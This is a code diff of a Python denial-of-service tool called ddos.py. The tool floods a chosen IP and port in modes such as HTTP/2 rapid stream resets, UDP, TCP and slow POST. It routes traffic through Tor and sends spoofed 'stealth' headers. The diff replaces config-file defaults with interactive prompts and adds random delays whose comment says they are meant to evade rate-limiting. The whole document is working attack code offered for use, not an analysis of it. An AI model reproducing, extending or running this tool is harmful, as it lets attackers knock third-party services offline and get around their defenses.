@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import os
-import socket, threading, random, time, sys, ssl, json
+import socket, threading, random, time, sys, ssl
 import socks  # PySocks for Tor support
 import ipaddress
 
@@ -20,7 +20,6 @@ except ImportError:
 
 USE_TOR = False
 MAX_CONNECTIONS_PER_THREAD = 3  # Number of HTTP/2 connections per thread
-CONFIG_FILE = "config.json"
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
@@ -40,26 +39,6 @@ USER_AGENTS = [
 STEALTH_HEADERS = [
     "X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"
 ]
-
-def load_config():
-    default_config = {
-        "ip": "192.168.1.1",
-        "port": 443,
-        "duration": 60,
-        "threads": 10,
-        "mode": "http2",
-        "loop": False
-    }
-    if not os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'w') as f:
-            json.dump(default_config, f, indent=4)
-        print(f"[!] Created default config file: {CONFIG_FILE}")
-    try:
-        with open(CONFIG_FILE, 'r') as f:
-            return json.load(f)
-    except:
-        print(f"[!] Error loading {CONFIG_FILE}. Using default settings.")
-        return default_config
 
 def stealth_http_headers():
     large_cookie = f"sessionid={os.urandom(16).hex()}; " + \
@@ -215,7 +194,6 @@ def http2_flood(ip, port, duration, threads):
             except:
                 return None, None
 
-        # Initialize connections
         for _ in range(MAX_CONNECTIONS_PER_THREAD):
             conn, s = create_connection()
             if conn and s:
@@ -228,7 +206,7 @@ def http2_flood(ip, port, duration, threads):
         stream_ids = {conn: 1 for conn, _ in connections}
 
         while time.time() < end:
-            for i, (conn, s) in enumerate(connections[:]):  # Copy to avoid modification issues
+            for i, (conn, s) in enumerate(connections[:]):
                 try:
                     active_streams = 0
                     while active_streams < max_concurrent_streams and time.time() < end:
@@ -240,8 +218,9 @@ def http2_flood(ip, port, duration, threads):
                             conn._send_frame(rst_frame)
                             stream_ids[conn] += 2
                             active_streams += 1
+                            # Random delay to evade rate-limiting
+                            time.sleep(random.uniform(0.005, 0.05))
                         except HyperException as e:
-                            # Check for GOAWAY
                             if "GOAWAY" in str(e):
                                 try:
                                     s.close()
@@ -257,7 +236,6 @@ def http2_flood(ip, port, duration, threads):
                                 break
                         except socket.error:
                             break
-                    time.sleep(0.01)
                 except:
                     try:
                         s.close()
@@ -298,16 +276,14 @@ def run_threads(attack_func, threads, duration, label):
 
 def parse_trigger(args):
     modes = ["http", "tls", "head", "ws", "udp", "tcp", "slowpost", "http2", "combo"]
-    config = load_config()
 
     if len(args) < 6:
         print("No command-line arguments provided. Entering interactive mode.")
-        print("Please provide the following information (press Enter to use defaults from config.json):")
+        print("Please provide the following information:")
 
         # Prompt for IP address
         while True:
-            default_ip = config.get("ip", "192.168.1.1")
-            ip = input(f"Target IP address (default: {default_ip}): ").strip() or default_ip
+            ip = input("Target IP address: ").strip()
             try:
                 ipaddress.ip_address(ip)
                 break
@@ -316,8 +292,7 @@ def parse_trigger(args):
 
         # Prompt for port
         while True:
-            default_port = config.get("port", 443)
-            port_str = input(f"Target port (default: {default_port}): ").strip() or str(default_port)
+            port_str = input("Target port (e.g., 80 for HTTP, 443 for HTTPS): ").strip()
             try:
                 port = int(port_str)
                 if 1 <= port <= 65535:
@@ -329,8 +304,7 @@ def parse_trigger(args):
 
         # Prompt for duration
         while True:
-            default_duration = config.get("duration", 60)
-            duration_str = input(f"Duration in seconds (default: {default_duration}): ").strip() or str(default_duration)
+            duration_str = input("Duration in seconds (e.g., 60): ").strip()
             try:
                 duration = int(duration_str)
                 if duration > 0:
@@ -342,8 +316,7 @@ def parse_trigger(args):
 
         # Prompt for threads
         while True:
-            default_threads = config.get("threads", 10)
-            threads_str = input(f"Number of threads (default: {default_threads}): ").strip() or str(default_threads)
+            threads_str = input("Number of threads (e.g., 10): ").strip()
             try:
                 threads = int(threads_str)
                 if threads > 0:
@@ -355,21 +328,19 @@ def parse_trigger(args):
 
         # Prompt for mode
         while True:
-            default_mode = config.get("mode", "http2")
             print(f"Available modes: {', '.join(modes)}")
-            mode = input(f"Mode (default: {default_mode}): ").strip().lower() or default_mode
+            mode = input("Mode: ").strip().lower()
             if mode in modes:
                 break
             print("Invalid mode. Please choose one of the available modes.")
 
         # Prompt for loop
         while True:
-            default_loop = config.get("loop", False)
-            loop_str = input(f"Enable loop mode? (y/n, default: {'y' if default_loop else 'n'}): ").strip().lower()
-            if loop_str in ['y', 'n', '']:
-                loop = loop_str == 'y' if loop_str else default_loop
+            loop_str = input("Enable loop mode? (y/n): ").strip().lower()
+            if loop_str in ['y', 'n']:
+                loop = loop_str == 'y'
                 break
-            print("Please enter 'y' for yes, 'n' for no, or press Enter for default.")
+            print("Please enter 'y' for yes or 'n' for no.")
     else:
         if len(args) < 6:
             print("Usage: python3 ddos.py <ip> <port> <duration> <threads> <mode> [--loop]")
